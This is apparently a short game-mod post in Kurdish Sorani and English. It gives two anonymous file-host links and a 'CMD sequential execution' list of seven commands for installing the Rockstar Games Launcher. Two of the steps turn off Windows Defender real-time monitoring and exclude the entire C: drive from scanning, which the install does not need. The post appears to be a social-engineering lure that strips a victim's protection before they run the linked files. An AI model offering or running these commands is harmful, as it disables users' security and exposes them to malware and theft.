

https://gofile.io/d/j6QNWKUh


https://gofile.io/d/RLTbn2Eb

mod made by seraph

```
+-----------------------------------+
| CMD SEQUENTIAL EXECUTION          |
| 7 STEPS TO INSTALL ROCKSTAR       |
+-----------------------------------+
```

Kurdish Sorani:

1. پشکنینی دەستڕۆیشتوویی Administrator:
   net session
2. ناچالاککردنی پاراستنی کاتی (Windows Defender):
   powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
3. زیادکردنی دەرکردن بۆ فۆڵدەری C:
   powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
4. داگرتنی فایلی دامەزراندنی Rockstar Games Launcher:
   powershell -Command "Invoke-WebRequest -Uri 'https://gamedownloads.rockstargames.com/public/installer/Rockstar-Games-Launcher.exe' -OutFile '%TEMP%\Rockstar-Games-Launcher.exe'"
5. دامەزراندنی بێدەنگ (Silent Install):
   %TEMP%\Rockstar-Games-Launcher.exe /S
6. دەستپێکردنی بەرنامەکە:
   start "" "%ProgramFiles%\Rockstar Games\Launcher\RockstarGamesLauncher.exe"
7. سڕینەوەی فایلی دامەزراندن:
   del /f /q "%TEMP%\Rockstar-Games-Launcher.exe"

English:

1. Check Administrator privileges:
   net session
2. Disable real-time protection (Windows Defender):
   powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
3. Add exclusion for C: drive:
   powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
4. Download Rockstar Games Launcher installer:
   powershell -Command "Invoke-WebRequest -Uri 'https://gamedownloads.rockstargames.com/public/installer/Rockstar-Games-Launcher.exe' -OutFile '%TEMP%\Rockstar-Games-Launcher.exe'"
5. Silent Install:
   %TEMP%\Rockstar-Games-Launcher.exe /S
6. Launch the application:
   start "" "%ProgramFiles%\Rockstar Games\Launcher\RockstarGamesLauncher.exe"
7. Delete the installer file:
   del /f /q "%TEMP%\Rockstar-Games-Launcher.exe"
